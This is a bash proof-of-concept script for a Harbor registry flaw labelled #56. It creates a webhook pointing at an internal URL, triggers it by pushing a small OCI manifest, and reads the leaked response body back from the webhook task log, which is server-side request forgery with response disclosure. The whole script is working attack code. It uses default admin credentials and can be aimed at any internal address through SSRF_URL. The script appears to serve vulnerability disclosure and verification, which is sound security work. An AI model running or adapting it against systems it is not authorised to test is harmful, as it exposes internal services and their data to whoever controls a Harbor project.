#!/usr/bin/env bash
set -euo pipefail

# PoC for #56:
# Project webhook target accepts an internal URL and leaks non-2xx response body
# through webhook task log. Creates a throwaway project and pushes a tiny OCI manifest
# through Harbor Core with raw registry HTTP; no docker/oras needed.
#
# Default target is a host-local Python listener reachable by many Docker Desktop
# Harbor deployments as host.docker.internal. If JobService cannot reach it, set:
#   SSRF_URL=http://<ip-or-host-reachable-from-jobservice>:50156/poc

HARBOR_URL="${HARBOR_URL:-http://127.0.0.1:8080}"
ADMIN_USER="${ADMIN_USER:-admin}"
ADMIN_PASS="${ADMIN_PASS:-Harbor12345}"
LISTEN_PORT="${LISTEN_PORT:-50156}"
SECRET="${SECRET:-SECTEST56-INTERNAL-SECRET-AKIAFAKE0000}"
SSRF_URL="${SSRF_URL:-http://host.docker.internal:$LISTEN_PORT/poc56}"
STAMP="$(date +%s)"
PROJECT="sectest-56-$STAMP"
REPO="probe"
TAG="v1"

need() {
  command -v "$1" >/dev/null || {
    echo "missing dependency: $1" >&2
    exit 1
  }
}

need curl
need jq
need python3
need sha256sum

api_admin() {
  curl -ksS -u "$ADMIN_USER:$ADMIN_PASS" "$@"
}

policy_id=""
listener_pid=""
orig_notification=""
tmpdir="$(mktemp -d)"

cleanup() {
  if [[ -n "$orig_notification" ]]; then
    api_admin -o /dev/null -w "%{http_code}" \
      -X PUT "$HARBOR_URL/api/v2.0/configurations" \
      -H 'Content-Type: application/json' \
      -d "{\"notification_enable\":$orig_notification}" >/dev/null || true
  fi
  api_admin -o /dev/null -w "%{http_code}" \
    -X DELETE "$HARBOR_URL/api/v2.0/projects/$PROJECT" >/dev/null || true
  if [[ -n "$listener_pid" ]]; then
    kill "$listener_pid" >/dev/null 2>&1 || true
  fi
  rm -rf "$tmpdir"
}
trap cleanup EXIT

cat >"$tmpdir/listener.py" <<PY
from http.server import BaseHTTPRequestHandler, HTTPServer
secret = ${SECRET@Q}.encode()
class H(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("content-length", "0") or "0")
        body = self.rfile.read(length)
        print("received POST", self.path, "len", len(body), flush=True)
        self.send_response(403)
        self.end_headers()
        self.wfile.write(secret)
    def log_message(self, fmt, *args):
        print(fmt % args, flush=True)
HTTPServer(("0.0.0.0", $LISTEN_PORT), H).serve_forever()
PY

python3 "$tmpdir/listener.py" >"$tmpdir/listener.log" 2>&1 &
listener_pid="$!"
sleep 1

echo "listener on host port $LISTEN_PORT; webhook target $SSRF_URL"

orig_notification="$(api_admin "$HARBOR_URL/api/v2.0/configurations" | jq -r '.notification_enable.value // .notification_enable // true')"
case "$orig_notification" in
  true|false) ;;
  *) orig_notification="true" ;;
esac
api_admin -o /dev/null -w "%{http_code}" \
  -X PUT "$HARBOR_URL/api/v2.0/configurations" \
  -H 'Content-Type: application/json' \
  -d '{"notification_enable":true}' | grep -Eq '200|204'

echo "creating project $PROJECT"
api_admin -o /dev/null -w "%{http_code}" \
  -X POST "$HARBOR_URL/api/v2.0/projects" \
  -H 'Content-Type: application/json' \
  -d "{\"project_name\":\"$PROJECT\",\"public\":false,\"metadata\":{\"public\":\"false\"}}" | grep -Eq '201|409'

echo "creating webhook policy to $SSRF_URL"
policy_headers="$tmpdir/policy.headers"
policy_code="$(
  api_admin -D "$policy_headers" -o "$tmpdir/policy.body" -w "%{http_code}" \
    -X POST "$HARBOR_URL/api/v2.0/projects/$PROJECT/webhook/policies" \
    -H 'Content-Type: application/json' \
    -d @- <<JSON
{
  "name": "sectest56-$STAMP",
  "enabled": true,
  "event_types": ["PUSH_ARTIFACT"],
  "targets": [{
    "type": "http",
    "address": "$SSRF_URL",
    "auth_header": "Bearer sectest56",
    "skip_cert_verify": true,
    "payload_format": "Default"
  }]
}
JSON
)"
policy_id="$(awk -F/ 'tolower($1)=="location:" {gsub("\r","",$NF); print $NF}' "$policy_headers" | tail -1)"
echo "policy create -> HTTP $policy_code policy_id=$policy_id"
cat "$tmpdir/policy.body"
echo
if [[ -z "$policy_id" || "$policy_id" == "null" ]]; then
  policy_id="$(
    api_admin "$HARBOR_URL/api/v2.0/projects/$PROJECT/webhook/policies?page=1&page_size=50" |
      jq -r --arg name "sectest56-$STAMP" '.[] | select(.name == $name) | .id' |
      tail -1
  )"
  echo "policy id from list fallback: $policy_id"
fi
[[ -n "$policy_id" && "$policy_id" != "null" ]] || {
  echo "failed to resolve webhook policy id" >&2
  exit 1
}

token="$(
  curl -ksS -u "$ADMIN_USER:$ADMIN_PASS" \
    "$HARBOR_URL/service/token?service=harbor-registry&scope=repository:$PROJECT/$REPO:pull,push" |
    jq -r '.token'
)"
[[ "$token" != "null" && -n "$token" ]] || {
  echo "failed to mint registry token" >&2
  exit 1
}

upload_blob() {
  local file="$1"
  local digest size loc sep code
  digest="sha256:$(sha256sum "$file" | awk '{print $1}')"
  size="$(wc -c <"$file" | tr -d ' ')"
  headers="$tmpdir/blob.headers"
  code="$(
    curl -ksS -D "$headers" -o "$tmpdir/blob.body" -w "%{http_code}" \
      -X POST "$HARBOR_URL/v2/$PROJECT/$REPO/blobs/uploads/" \
      -H "Authorization: Bearer $token"
  )"
  [[ "$code" == "202" ]] || { echo "blob upload start failed HTTP $code"; cat "$tmpdir/blob.body"; exit 1; }
  loc="$(awk 'tolower($1)=="location:" {sub(/\r$/,""); print $2}' "$headers" | tail -1)"
  [[ "$loc" == http* ]] || loc="$HARBOR_URL$loc"
  [[ "$loc" == *\?* ]] && sep="&" || sep="?"
  code="$(
    curl -ksS -o "$tmpdir/blob-put.body" -w "%{http_code}" \
      -X PUT "${loc}${sep}digest=$digest" \
      -H "Authorization: Bearer $token" \
      -H 'Content-Type: application/octet-stream' \
      --data-binary @"$file"
  )"
  [[ "$code" == "201" ]] || { echo "blob upload finish failed HTTP $code"; cat "$tmpdir/blob-put.body"; exit 1; }
  printf '%s %s\n' "$digest" "$size"
}

printf '{}' >"$tmpdir/config.json"
printf 'hello from sectest56\n' >"$tmpdir/layer.txt"
read -r config_digest config_size < <(upload_blob "$tmpdir/config.json")
read -r layer_digest layer_size < <(upload_blob "$tmpdir/layer.txt")

jq -n \
  --arg cd "$config_digest" --argjson cs "$config_size" \
  --arg ld "$layer_digest" --argjson ls "$layer_size" \
  '{
    schemaVersion: 2,
    mediaType: "application/vnd.oci.image.manifest.v1+json",
    config: {mediaType: "application/vnd.oci.empty.v1+json", digest: $cd, size: $cs},
    layers: [{mediaType: "application/octet-stream", digest: $ld, size: $ls}]
  }' >"$tmpdir/manifest.json"

echo "pushing tiny manifest to trigger PUSH_ARTIFACT"
manifest_code="$(
  curl -ksS -o "$tmpdir/manifest.body" -w "%{http_code}" \
    -X PUT "$HARBOR_URL/v2/$PROJECT/$REPO/manifests/$TAG" \
    -H "Authorization: Bearer $token" \
    -H 'Content-Type: application/vnd.oci.image.manifest.v1+json' \
    --data-binary @"$tmpdir/manifest.json"
)"
echo "manifest PUT -> HTTP $manifest_code"
cat "$tmpdir/manifest.body"
echo
[[ "$manifest_code" == "201" ]] || exit 1

echo "polling webhook task log for leaked body"
for _ in $(seq 1 40); do
  executions="$(api_admin "$HARBOR_URL/api/v2.0/projects/$PROJECT/webhook/policies/$policy_id/executions?page=1&page_size=5&sort=-creation_time" || true)"
  execution_id="$(jq -r '.[0].id // empty' <<<"$executions" 2>/dev/null || true)"
  if [[ -n "$execution_id" ]]; then
    tasks="$(api_admin "$HARBOR_URL/api/v2.0/projects/$PROJECT/webhook/policies/$policy_id/executions/$execution_id/tasks?page=1&page_size=5" || true)"
    task_id="$(jq -r '.[0].id // empty' <<<"$tasks" 2>/dev/null || true)"
    if [[ -n "$task_id" ]]; then
      log="$(api_admin "$HARBOR_URL/api/v2.0/projects/$PROJECT/webhook/policies/$policy_id/executions/$execution_id/tasks/$task_id/log" || true)"
      if grep -q "$SECRET" <<<"$log"; then
        echo "$log"
        echo
        echo "VULNERABLE: internal response body leaked through webhook task log."
        exit 0
      fi
    fi
  fi
  sleep 3
done

echo "NOT CONFIRMED: no leaked body found."
echo "listener log:"
cat "$tmpdir/listener.log" || true
echo
echo "If listener saw no POST, set SSRF_URL to an address reachable from Harbor JobService."
exit 2
